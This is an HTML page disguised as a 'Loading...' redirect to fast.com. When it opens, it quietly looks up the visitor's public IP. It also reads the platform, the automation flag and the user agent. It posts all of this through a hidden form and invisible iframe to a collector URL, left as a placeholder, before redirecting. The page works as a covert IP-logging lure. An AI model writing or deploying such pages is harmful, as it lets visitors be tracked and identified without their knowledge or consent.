<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #0f172a;
            color: #94a3b8;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .log { font-size: 0.9rem; letter-spacing: 0.05em; }
    </style>
</head>
<body>
    <div class="log" id="log">Initializing session...</div>

    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>

    <script>
        const WEB_APP_URL = "YOUR_NEW_WEB_APP_URL_HERE";
        const TARGET_URL = "https://fast.com";

        async function run() {
            const logEl = document.getElementById('log');

            let clientIp = "Unknown";
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 800);
                const res = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
                clearTimeout(timeoutId);
                const data = await res.json();
                clientIp = data.ip || "Unknown";
            } catch (e) {}

            logEl.innerText = "Connecting...";

            const form = document.createElement('form');
            form.method = 'POST';
            form.action = WEB_APP_URL;
            form.target = 'hidden_iframe';

            const payload = {
                ip: clientIp,
                platform: navigator.platform || "Unknown",
                isAutomated: navigator.webdriver ? "true" : "false",
                userAgent: navigator.userAgent || "Unknown"
            };

            for (const key in payload) {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = key;
                input.value = payload[key];
                form.appendChild(input);
            }

            document.body.appendChild(form);
            form.submit();

            logEl.innerText = "Redirecting...";

            setTimeout(() => {
                window.location.replace(TARGET_URL);
            }, 600);
        }

        window.onload = run;
    </script>
</body>
</html>
